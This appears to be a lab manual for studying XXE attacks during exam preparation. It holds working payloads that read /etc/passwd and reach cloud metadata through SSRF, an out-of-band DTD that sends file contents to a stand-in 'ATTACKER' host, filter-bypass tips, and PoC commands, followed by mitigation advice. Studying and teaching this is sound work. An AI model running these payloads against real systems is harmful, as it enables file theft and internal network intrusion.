## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# XXE File Read / OOB / SSRF — Lab Manual

## Vulnerability summary

| Item | Detail |
|------|--------|
| Target class | Apps parsing **XML** with external entities / DTD resolution enabled |
| Type | XXE (CWE-611) → file disclosure, SSRF, sometimes RCE (rare) |
| Impact | Secrets, cloud metadata, internal network pivot |
| PoC | `poc.py` (+ `dtd/` for OOB) |
| Guide | `guides/XXE-Attack-Vectors.md` |
| Case | `notes/XXE-FILE-READ-SSRF.md` |

---

## Root cause

XML parsers that process attacker-supplied documents and resolve external entities allow:

```xml
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

If the entity value is reflected, you get **in-band** file read. If not, use **error-based** or **out-of-band (OOB)** via attacker-hosted DTD.

### Vulnerable patterns

**Java**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// default often unsafe on older stacks
DocumentBuilder db = dbf.newDocumentBuilder();
db.parse(input);
```

**PHP**
```php
simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOENT);
// or DOMDocument without disabling entities
```

**.NET**
```csharp
// older XmlDocument / XmlTextReader defaults varied by framework version
```

---

## Attack chain decision tree

```text
XML accepted?
  ├─ Entity reflected in response → classic file read / SSRF in-band
  ├─ Verbose errors → error-based exfil
  ├─ No reflection, outbound allowed → OOB DTD parameter entities
  └─ No outbound → limited; try local DTD tricks / blind timing (hard)
```

---

## Lab setup

### Options

1. GoSecure XXE workshop apps (README)
2. XXE-Study GitHub lab
3. DVWA / custom PHP `simplexml` endpoint
4. Java servlet accepting `application/xml`

### Attacker services

```bash
# OOB HTTP
python3 -m http.server 8000
# serve evil.dtd from dtd/ directory

# Monitor
nc -lvnp 8000   # or use http.server logs
tcpdump -ni eth0 port 8000
```

### Sample evil DTD (OOB)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%exfil;
```

Host as `http://ATTACKER:8000/evil.dtd`.

---

## Payload catalog (study)

### 1. In-band file read

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

Windows: `file:///C:/Windows/win.ini`

### 2. SSRF

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

Cloud metadata (if reachable): `http://169.254.169.254/`

### 3. OOB parameter entity

```xml
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://ATTACKER:8000/evil.dtd">
  %dtd;
]>
<data>x</data>
```

### 4. XInclude (when entities blocked but XInclude on)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 5. SVG / Office / SOAP wrappers

XXE often hides in file upload (SVG, DOCX/XML, SAML, SOAP). Unpack and inject XML parts.

---

## Manual walkthrough

### Stage 1 — Find XML sinks

```bash
grep -Rn "DocumentBuilder\|XMLReader\|simplexml\|XmlDocument\|SOAP\|application/xml" .
```

Black-box: content-type `application/xml`, file upload of `.xml`/`.svg`, content-type confusion.

### Stage 2 — Benign entity test

Define internal entity; see if expansion works:

```xml
<!DOCTYPE d [ <!ENTITY t "abc"> ]><r>&t;</r>
```

### Stage 3 — file:// attempt

### Stage 4 — OOB if blind

1. Start HTTP server with DTD
2. Send external DTD reference
3. Watch for fetch + query-string exfil (length limits apply)

### Stage 5 — SSRF pivot

Internal admin panels, redis/http debug ports, cloud metadata — only in authorized labs.

---

## Using this PoC

```bash
# File read (in-band / as implemented)
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --file /etc/passwd

# OOB
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --attack-type oob --file /etc/hostname

# SSRF
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --attack-type ssrf \
  --ssrf-target http://127.0.0.1:8080/
```

Check `poc.py --help` for exact flags. Place DTDs under `dtd/` as needed.

---

## Encoding & filters

| Filter | Try |
|--------|-----|
| Strips `DOCTYPE` | UTF-16 encoding, different content-type path |
| Blocks `file://` | `php://`, `expect://` (PHP rare), HTTP OOB only |
| Blocks external HTTP | jar: tricks (Java historical), local DTD |
| WAF keywords | parameter entities, encoding, nested |

---

## Debugging

| Symptom | Checks |
|---------|--------|
| No expansion | Parser disables DTDs; wrong parser path |
| OOB no hit | Egress filtered; need different channel |
| Truncated file | Entity size limits; read in chunks via OOB techniques |
| SSRF blocked | Allow-list DNS; try IP literal, redirect tricks |

---

## OSWE exam notes

- Always test **internal entity** before complex OOB.
- Script both in-band and OOB paths in one PoC with a switch.
- Upload-based XXE (SVG) is easy to miss in pure API testing.
- XXE → SSRF → secondary deserial/admin can be the real chain.
- Time box OOB infra setup (pre-stage HTTP server + DTD template in skeleton).

### Time model

| Step | Budget |
|------|--------|
| Find XML sink | 10–20 min |
| In-band confirm | 10 min |
| OOB working | 15–30 min |
| Useful file / pivot | 20+ min |

---

## Mitigation

**Java**
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// also disable external entities / XInclude explicitly
```

**PHP**: use `libxml_disable_entity_loader` historically; prefer parser configs that deny external entities; keep libxml updated.

**General**: do not accept arbitrary XML; prefer JSON; schema validation alone ≠ XXE-safe.

---

## References

- PortSwigger XXE academy
- OWASP XXE
- GoSecure XXE workshop (README)
- `guides/XXE-Attack-Vectors.md`
- `notes/XXE-FILE-READ-SSRF.md`
